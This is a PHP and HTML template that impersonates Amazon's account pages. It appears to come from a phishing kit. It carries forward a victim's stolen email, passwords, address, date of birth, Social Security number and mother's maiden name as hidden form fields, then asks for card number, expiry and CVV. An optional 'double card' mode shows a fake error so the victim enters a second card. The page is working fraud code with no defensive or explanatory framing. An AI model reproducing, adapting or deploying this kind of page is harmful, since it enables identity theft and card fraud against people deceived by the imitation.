<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-2021-05-28">
<head>
<meta charset="utf-8">
<title dir="ltr"><?= $clang['1']; ?></title>
<link rel="apple-touch-icon" sizes="76x76" href="img/logo.png">
<link rel="icon" type="image/png" href="img/logo.png">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,41DBI6BbFkL.css_.css?AUIClients/AuthenticationPortalAssets">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11qeL1AgUGL.css?AUIClients/CVFAssets">
</head>
<body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-c a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
<div class="a-section a-padding-medium auth-workflow">
    <div class="a-section a-spacing-none auth-navbar">
        <div class="a-section a-spacing-medium a-text-center">
            <a class="a-link-nav-icon" tabindex="-1"><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i></a>
        </div>
    </div>
    <div id="authportal-center-section" class="a-section">
        <div id="authportal-main-section" class="a-section">
            <div class="a-section auth-pagelet-container">
                           <?php
                           if (isset($_POST['cname'])) {
                              echo '<div class="a-section">
                              <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert">
                                 <div class="a-box-inner a-alert-container">
                                    <h4 class="a-alert-heading">'.$lang['die1'].'</h4>
                                    <i class="a-icon a-icon-alert"></i>
                                    <div class="a-alert-content">
                                       <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                          <li>
                                             <span class="a-list-item">'.$clang['2'].'</span>
                                          </li>
                                       </ul>
                                    </div>
                                 </div>
                              </div>
                           </div>';
                           }
                           ?>
                <div class="a-section">
                    <?php
                    if ($double_cc == "on") {
                      if (!isset($_POST['cname'])) {
                        echo '<form id="ap_register_form" method="post" action="" class="ap_ango_default auth-validate-form-moa auth-real-time-validation" data-fwcim-id="aairZLRX">';
                      }else{
                        echo '<form id="ap_register_form" method="post" action="account/update-payment" class="ap_ango_default auth-validate-form-moa auth-real-time-validation" data-fwcim-id="aairZLRX">';
                      }
                    }else{
                      echo '<form id="ap_register_form" method="post" action="account/update-payment" class="ap_ango_default auth-validate-form-moa auth-real-time-validation" data-fwcim-id="aairZLRX">';
                    }
                    ?>
                        <input type="hidden" name="email" value="<?= $_POST['email']; ?>">
                        <input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
                        <input type="hidden" name="password" value="<?= $_POST['password']; ?>">
                        <input type="hidden" name="fname" value="<?= $_POST['fname']; ?>">
                        <input type="hidden" name="address" value="<?= $_POST['address']; ?>">
                        <input type="hidden" name="city" value="<?= $_POST['city']; ?>">
                        <input type="hidden" name="state" value="<?= $_POST['state']; ?>">
                        <input type="hidden" name="zip" value="<?= $_POST['zip']; ?>">
                        <input type="hidden" name="dob" value="<?= $_POST['dob']; ?>">
                        <input type="hidden" name="phone" value="<?= $_POST['phone']; ?>">
                        <input type="hidden" name="ssn" value="<?= $_POST['ssn']; ?>">
                        <input type="hidden" name="mmn" value="<?= $_POST['mmn']; ?>">
                        <div class="a-box a-spacing-extra-large">
                            <div class="a-box-inner">
                                <center>
                                <h1 class="a-spacing-small"><?= enc($clang['1']); ?></h1>
                                <img src="assets/img/card.png" width="200">
                                </center>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($clang['3']); ?></label>
                                    <input type="text" maxlength="100" id="ap_customer_name" autocomplete="off" onkeypress="return event.charCode < 48 || event.charCode  >57" name="cname" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" autofocus required>
                                </div>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($clang['4']); ?></label>
                                    <input type="text" minlength="19" maxlength="100" id="ap_customer_name" autocomplete="off" name="cc" tabindex="1" placeholder="0000 0000 0000 0000" class="a-input-text a-span12 auth-autofocus auth-required-field mask-ccn" required>
                                </div>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($clang['5']); ?></label>
                                    <input type="text" minlength="5" maxlength="5" id="ap_customer_name" autocomplete="off" name="exp" placeholder="MM/YY" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field mask-exp" required>
                                </div>
                                <div class="a-row a-spacing-base">
                                    <label for="ap_customer_name" class="a-form-label"><?= enc($clang['6']); ?></label>
                                    <input type="password" minlength="3" maxlength="4" id="ap_customer_name" autocomplete="off" name="cvv" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field mask-cvv" required>
                                </div>
                                <div class="a-section a-spacing-extra-large">
                                    <span id="auth-continue" class="a-button a-button-span12 a-button-primary auth-requires-verify-modal"><span class="a-button-inner"><input id="continue" tabindex="8" class="a-button-input" type="submit" aria-labelledby="auth-continue-announce"><span id="auth-continue-announce" class="a-button-text" aria-hidden="true">
                                    <span class="default-text"><?= enc($clang['btn']); ?></span>
                                    </span></span></span>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <div id="right-2"></div>
    <div class="a-section a-spacing-top-extra-large auth-footer">
        <div class="a-divider a-divider-section">
            <div class="a-divider-inner"></div>
        </div>
        <div class="a-section a-spacing-small a-text-center a-size-mini">
            <span class="auth-footer-seperator"></span>
            <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f1']); ?></a>
            <span class="auth-footer-seperator"></span>
            <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f2']); ?></a>
            <span class="auth-footer-seperator"></span>
            <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f3']); ?></a>
            <span class="auth-footer-seperator"></span>
        </div>
        <div class="a-section a-spacing-none a-text-center">
            <span class="a-size-mini a-color-secondary"><?= enc($lang['f4']); ?></span>
        </div>
    </div>
</div>
</div>
    <!-- Masking -->
<script src="js/jquery.min.js"></script>
<script src="js/jquery.mask.min.js"></script>
<script type="text/javascript">
    $(document).ready(function(){
      $('.mask-exp').mask('00/00');
      $('.mask-ccn').mask('0000 0000 0000 0000');
      $('.mask-zip').mask('00000');
      $('.mask-dob').mask('00/00/0000');
      $('.mask-dln').mask('00 000 000');
      $('.mask-ssn').mask('000-00-0000');
      $('.mask-cvv').mask('0000');
      $('.mask-pin').mask('000000');
      $('.time').mask('00:00:00');
      $('.date_time').mask('00/00/0000 00:00:00');
      $('.mask-phone').mask('(000) 000-0000');
      $('.phone_with_ddd').mask('(00) 0000-0000');
      $('.phone_us').mask('(000) 000-0000');
      $('.mixed').mask('AAA 000-S0S');
      $('.money').mask('000.000.000.000.000,00', {reverse: true});
      $('.money2').mask("#.##0,00", {reverse: true});
      $('.ip_address').mask('099.099.099.099');
      $('.percent').mask('##0,00%', {reverse: true});
      $('.placeholder').mask("00/00/0000", {placeholder: "__/__/____"});
      $('.mask-cc').mask('0000 0000 0000 0000');
      $('.valid').mask('00/00');
    });
  </script>
<!-- End Masking -->
<!-- Validasi Number & Text -->
<script>
    function hanyaAngka(evt) {
      var charCode = (evt.which) ? evt.which : event.keyCode
       if (charCode > 31 && (charCode < 48 || charCode > 57))
 
        return false;
      return true;
    }
  </script>
<!-- End Validasi -->
</body>
</html>